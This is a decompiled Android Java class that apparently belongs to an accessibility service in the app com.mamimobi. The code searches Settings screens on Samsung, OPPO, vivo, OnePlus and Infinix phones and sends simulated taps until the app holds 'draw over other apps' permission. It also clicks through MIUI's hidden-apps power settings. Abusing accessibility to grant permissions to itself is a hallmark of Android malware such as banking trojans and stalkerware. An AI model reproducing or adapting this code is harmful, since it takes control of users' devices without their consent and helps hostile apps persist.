package defpackage;

import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import com.mamimobi.AccessService;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

/* JADX INFO: loaded from: classes.dex */
public abstract class uj0 {
    public static k1 e;
    public static AccessibilityEvent f;
    public static final AtomicBoolean a = new AtomicBoolean(false);
    public static final AtomicBoolean b = new AtomicBoolean(false);
    public static final AtomicBoolean c = new AtomicBoolean(false);
    public static final Handler d = new Handler(Looper.getMainLooper());
    public static long g = 0;

    public static void a(AccessService accessService, AccessibilityEvent accessibilityEvent) {
        int eventType = accessibilityEvent.getEventType();
        if (eventType == 32 || eventType == 2048 || eventType == 4194304) {
            Handler handler = d;
            if (eventType != 2048) {
                handler.post(new t1(accessService, accessibilityEvent, 1));
                return;
            }
            long jCurrentTimeMillis = System.currentTimeMillis();
            if (jCurrentTimeMillis - g < 300) {
                return;
            }
            g = jCurrentTimeMillis;
            f = AccessibilityEvent.obtain(accessibilityEvent);
            k1 k1Var = e;
            if (k1Var != null) {
                handler.removeCallbacks(k1Var);
            }
            k1 k1Var2 = new k1(accessService, 8);
            e = k1Var2;
            handler.postDelayed(k1Var2, 200L);
        }
    }

    public static void b(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        AccessibilityNodeInfo accessibilityNodeInfo2;
        if (accessibilityNodeInfo == null) {
            return;
        }
        LinkedList linkedList = new LinkedList();
        linkedList.add(accessibilityNodeInfo);
        while (true) {
            if (linkedList.isEmpty()) {
                accessibilityNodeInfo2 = null;
                break;
            }
            accessibilityNodeInfo2 = (AccessibilityNodeInfo) linkedList.poll();
            if (accessibilityNodeInfo2 != null) {
                if (accessibilityNodeInfo2.isScrollable()) {
                    break;
                }
                for (int i = 0; i < accessibilityNodeInfo2.getChildCount(); i++) {
                    linkedList.add(accessibilityNodeInfo2.getChild(i));
                }
            }
        }
        if (accessibilityNodeInfo2 != null && b.compareAndSet(false, true)) {
            Executors.newSingleThreadExecutor().execute(new j(accessibilityNodeInfo, str, accessibilityNodeInfo2, 5));
        }
    }

    public static AccessibilityNodeInfo c(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        if (accessibilityNodeInfo == null) {
            return null;
        }
        LinkedList linkedList = new LinkedList();
        linkedList.add(accessibilityNodeInfo);
        while (!linkedList.isEmpty()) {
            AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) linkedList.poll();
            if (accessibilityNodeInfo2 != null && accessibilityNodeInfo2.isVisibleToUser()) {
                CharSequence text = accessibilityNodeInfo2.getText();
                if (text != null && text.toString().toLowerCase().contains(str.toLowerCase())) {
                    return accessibilityNodeInfo2;
                }
                for (int i = 0; i < accessibilityNodeInfo2.getChildCount(); i++) {
                    linkedList.add(accessibilityNodeInfo2.getChild(i));
                }
            }
        }
        return null;
    }

    public static void d(AccessService accessService, AccessibilityEvent accessibilityEvent) {
        int type;
        AccessibilityNodeInfo child;
        AtomicBoolean atomicBoolean = a;
        try {
            if (!atomicBoolean.get() && AccessService.e0 != null) {
                String str = AccessService.V;
                List<AccessibilityWindowInfo> windows = accessService.getWindows();
                if (windows.isEmpty()) {
                    return;
                }
                for (AccessibilityWindowInfo accessibilityWindowInfo : windows) {
                    if (accessibilityWindowInfo != null && accessibilityWindowInfo.isActive() && (type = accessibilityWindowInfo.getType()) != 4 && type != 2 && type != 5) {
                        CharSequence title = accessibilityWindowInfo.getTitle();
                        if (title != null && accessibilityWindowInfo.isActive() && (fa0.G(title.toString(), la0.F) || fa0.G(title.toString(), la0.I))) {
                            AccessibilityNodeInfo root = accessibilityWindowInfo.getRoot();
                            AccessibilityNodeInfo accessibilityNodeInfoD = d91.d(root, "android:id/summary");
                            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = root.findAccessibilityNodeInfosByViewId("android:id/title");
                            if (accessibilityNodeInfoD == null && listFindAccessibilityNodeInfosByViewId != null && listFindAccessibilityNodeInfosByViewId.size() == 1) {
                                accessibilityNodeInfoD = listFindAccessibilityNodeInfosByViewId.get(0);
                            }
                            if (accessibilityNodeInfoD == null) {
                                if (!Settings.canDrawOverlays(accessService)) {
                                    b(root, str);
                                    return;
                                }
                                AccessService.e0.B();
                                AccessService.e0.B();
                                atomicBoolean.set(true);
                                return;
                            }
                            if (Settings.canDrawOverlays(accessService)) {
                                AccessService.e0.B();
                                AccessService.e0.B();
                                atomicBoolean.set(true);
                                return;
                            } else {
                                if (listFindAccessibilityNodeInfosByViewId != null && listFindAccessibilityNodeInfosByViewId.size() > 1) {
                                    b(root, str);
                                    return;
                                }
                                accessibilityNodeInfoD.getBoundsInScreen(new Rect());
                                of.a(new s1((int) (r12.right - (d91.c(52.0f) / 2.0f)), (int) (r12.top - (d91.c(52.0f) / 2.0f)), 2));
                                return;
                            }
                        }
                        if (title == null || !accessibilityWindowInfo.isActive() || (!fa0.G(title.toString(), la0.F) && !fa0.G(title.toString(), la0.G))) {
                            if (accessibilityEvent.getEventType() == 32) {
                                CharSequence className = accessibilityEvent.getClassName();
                                Objects.requireNonNull(className);
                                if (!"com.miui.powerkeeper.ui.HiddenAppsConfigActivity".contentEquals(className.toString()) || f11.c(AccessService.e0) || (child = accessibilityWindowInfo.getRoot().getChild(0)) == null) {
                                    return;
                                }
                                child.getBoundsInScreen(new Rect());
                                d91.a(AccessService.e0, (r13.left + r13.right) / 5, (int) (((r13.bottom * 3) / 13.0f) + d91.c(36.0f)));
                                la.u.set(true);
                                la.s();
                                return;
                            }
                            return;
                        }
                        if (Settings.canDrawOverlays(accessService)) {
                            AccessService.e0.B();
                            atomicBoolean.set(true);
                            return;
                        }
                        AccessibilityNodeInfo root2 = accessibilityWindowInfo.getRoot();
                        String str2 = Build.MANUFACTURER;
                        if (str2.equals("samsung")) {
                            if (c.compareAndSet(false, true)) {
                                if (!Settings.canDrawOverlays(accessService)) {
                                    b(root2, str);
                                    return;
                                }
                                AccessService.e0.B();
                                AccessService.e0.B();
                                atomicBoolean.set(true);
                                return;
                            }
                            if (!Settings.canDrawOverlays(accessService)) {
                                b.set(false);
                                b(root2, str);
                                return;
                            } else {
                                AccessService.e0.B();
                                AccessService.e0.B();
                                atomicBoolean.set(true);
                                return;
                            }
                        }
                        if (str2.equals("OPPO")) {
                            if (Settings.canDrawOverlays(accessService)) {
                                AccessService.e0.B();
                                AccessService.e0.B();
                                atomicBoolean.set(true);
                                return;
                            }
                            AccessibilityNodeInfo accessibilityNodeInfoD2 = d91.d(root2, "android:id/summary");
                            if (accessibilityNodeInfoD2 == null || !fa0.G(accessibilityNodeInfoD2.getText().toString(), la0.H)) {
                                b(root2, str);
                                return;
                            }
                            if (!Settings.canDrawOverlays(accessService)) {
                                accessibilityNodeInfoD2.getBoundsInScreen(new Rect());
                                of.a(new s1((int) (r12.right - (d91.c(52.0f) / 2.0f)), (int) (r12.top - (d91.c(52.0f) / 2.0f)), 3));
                                return;
                            } else {
                                AccessService.e0.B();
                                AccessService.e0.B();
                                atomicBoolean.set(true);
                                return;
                            }
                        }
                        if (str2.equals("vivo")) {
                            if (Settings.canDrawOverlays(accessService)) {
                                AccessService.e0.B();
                                AccessService.e0.B();
                                atomicBoolean.set(true);
                                return;
                            }
                            AccessibilityNodeInfo accessibilityNodeInfoD3 = d91.d(root2, "android:id/summary");
                            if (accessibilityNodeInfoD3 == null || !fa0.G(accessibilityNodeInfoD3.getText().toString(), la0.H)) {
                                b(root2, str);
                                return;
                            }
                            if (!Settings.canDrawOverlays(accessService)) {
                                accessibilityNodeInfoD3.getBoundsInScreen(new Rect());
                                of.a(new s1((int) (r12.right - (d91.c(52.0f) / 2.0f)), (int) (r12.top - (d91.c(52.0f) / 2.0f)), 4));
                                return;
                            } else {
                                AccessService.e0.B();
                                AccessService.e0.B();
                                atomicBoolean.set(true);
                                return;
                            }
                        }
                        if (str2.equals("OnePlus")) {
                            if (Settings.canDrawOverlays(accessService)) {
                                AccessService.e0.B();
                                AccessService.e0.B();
                                atomicBoolean.set(true);
                                return;
                            }
                            AccessibilityNodeInfo accessibilityNodeInfoD4 = d91.d(root2, "android:id/summary");
                            if (accessibilityNodeInfoD4 == null || !fa0.G(accessibilityNodeInfoD4.getText().toString(), la0.H)) {
                                b(root2, str);
                                return;
                            }
                            if (!Settings.canDrawOverlays(accessService)) {
                                accessibilityNodeInfoD4.getBoundsInScreen(new Rect());
                                of.a(new s1((int) (r12.right - (d91.c(52.0f) / 2.0f)), (int) (r12.top - (d91.c(52.0f) / 2.0f)), 5));
                                return;
                            } else {
                                AccessService.e0.B();
                                AccessService.e0.B();
                                atomicBoolean.set(true);
                                return;
                            }
                        }
                        if (str2.equals("Infinix")) {
                            if (Settings.canDrawOverlays(accessService)) {
                                AccessService.e0.B();
                                AccessService.e0.B();
                                atomicBoolean.set(true);
                                return;
                            }
                            AccessibilityNodeInfo accessibilityNodeInfoD5 = d91.d(root2, "android:id/summary");
                            if (accessibilityNodeInfoD5 == null || !fa0.G(accessibilityNodeInfoD5.getText().toString(), la0.H)) {
                                b(root2, str);
                                return;
                            }
                            if (!Settings.canDrawOverlays(accessService)) {
                                accessibilityNodeInfoD5.getBoundsInScreen(new Rect());
                                of.a(new s1((int) (r12.right - (d91.c(52.0f) / 2.0f)), (int) (r12.top - (d91.c(52.0f) / 2.0f)), 6));
                                return;
                            } else {
                                AccessService.e0.B();
                                AccessService.e0.B();
                                atomicBoolean.set(true);
                                return;
                            }
                        }
                        return;
                    }
                }
            }
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }
}
